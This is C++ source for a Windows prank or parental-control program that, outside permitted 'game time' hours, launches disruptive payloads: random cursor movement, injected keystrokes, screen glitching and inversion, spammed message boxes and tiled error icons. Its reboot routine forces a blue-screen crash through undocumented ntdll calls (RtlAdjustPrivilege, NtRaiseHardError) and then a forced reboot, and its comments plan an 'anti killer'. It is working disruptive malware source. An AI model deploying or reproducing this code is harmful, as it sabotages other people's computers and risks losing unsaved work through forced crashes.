#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <atomic>
#include <thread>
#include <random>
#include <array>
#include <vector>
#include <functional>
#include "payloads.h"

#define TIME_SECOND 1000
#define MAX_RUNTIME 15

std::random_device rd;
std::mt19937 mt(rd());
std::atomic<int> runtime = 0;

//#define TEST

void reboot(void) 
{
#ifdef TEST
	std::cout << "REBOOT" << std::endl;
	exit(1);
#else
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
#endif
}

void PayloadMessageBox(void)
{
	
	const LPCTSTR messages[]{
		L"Please exit the game zone lol!",
		L"Please stop play game!!!1!!"
	};
	std::uniform_int_distribution<int> dist(0, 1);

	for (;;) {
		//std::thread([&]() {
			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION);
		//}).detach();
		std::this_thread::sleep_for(std::chrono::seconds(15 * 2 - runtime));
	}
}

void PayloadCursor(void)
{
	POINT cursor;
	std::uniform_int_distribution<int> dist(0, 2);

	for (;;) {
		GetCursorPos(&cursor);

		cursor.x += ((dist(mt) - 1) * 2) * runtime / 2;
		cursor.y += ((dist(mt) - 1) * 2) * runtime / 2;
		SetCursorPos(cursor.x, cursor.y);

		std::this_thread::sleep_for(std::chrono::milliseconds(40));
	}
}

// this function does not work.
void PayloadKeyboardInput(void)
{
	INPUT input;
	std::uniform_int_distribution<int> dist('a', 'z');

	input.type = INPUT_KEYBOARD;
	for (;;) {
		input.ki.wVk = dist(mt);
		SendInput(1, &input, sizeof(input));
		std::this_thread::sleep_for(std::chrono::seconds(16 - runtime));
	}
}

void PayloadScreenGlitch(void)
{
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);
	std::uniform_int_distribution<int> dx(0, x);
	std::uniform_int_distribution<int> dy(0, y);
	std::uniform_int_distribution<int> cx(200, x);
	std::uniform_int_distribution<int> cy(200, y);

	int waittime = 15;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		BitBlt(hdc, dx(mt), dy(mt), cx(mt), cy(mt), hdc, dx(mt), dx(mt), SRCCOPY);
		std::this_thread::sleep_for(std::chrono::seconds(static_cast<int>(waittime - std::floor(runtime / (MAX_RUNTIME / waittime)))));
	}
}

void PayloadInvert(void) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	auto w = GetSystemMetrics(SM_CXSCREEN);
	auto h = GetSystemMetrics(SM_CYSCREEN);

	for (;;) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		std::this_thread::sleep_for(std::chrono::seconds(20 - runtime));
	}
}

// todo:
//  DONE multithread 
//  anti killer
//  bsod at end
void LaunchPayloads(void)
{
	std::array<std::function<void(void)>, 5> payloads = {
			PayloadKeyboardInput,
			PayloadCursor,
			PayloadMessageBox,
			PayloadScreenGlitch,
			PayloadInvert
	};

	for (unsigned i = 0; i < payloads.size(); i++) {
		std::thread(payloads.at(i)).detach();
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
	for (;;) {
		DrawIcon(hdc, mt() % (w - ix), mt() % (h - iy), icon);
	}
}

void yesnobox(void) {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT r;
	GetWindowRect(hwnd, &r);
	int w = r.right - r.left;
	int h = r.bottom - r.top;
	HICON icon = LoadIcon(nullptr, IDI_ERROR);

	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND) == IDCANCEL) {
		for (int i = 0; i < 10; ++i) {
			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
		}
		std::this_thread::sleep_for(std::chrono::seconds(5));
		reboot();
	}
}

void nonblockingMsg(LPCWSTR displaystring, LPCWSTR title, int flags) {
	MessageBox(nullptr, displaystring, title, flags);
}

int main(void)
{
	for (;;) {
		time_t t = time(NULL);
		tm tptr;
		localtime_s(&tptr, &t); // TODO: use system time or GMT or something idk just make it not use local time because people can change that AAAAAAAAA
#if 0 // TODO: this gives me "unresolved external symbol" errors
		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
			std::thread(nonblockingMsg, L"Please attatch ethernet cord", L"Warning", MB_OK).detach();
			std::this_thread::sleep_for(std::chrono::seconds(15));
			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
				goto startofend;
			}
		}
#endif
		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // FIXME: this breaks when time is modified
#ifdef TEST
			std::cout << "Game time" << std::endl;
			goto startofend;
#endif
			std::this_thread::sleep_for(std::chrono::minutes(5));
			continue;
		}

startofend:
		std::thread(yesnobox).detach();
		std::thread(LaunchPayloads).detach();
		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
			std::cout << "running for: " << runtime << std::endl;
#ifdef TEST
			std::this_thread::sleep_for(std::chrono::seconds(5));
#else
			std::this_thread::sleep_for(std::chrono::seconds(60));
#endif
		}
		reboot();
	}
}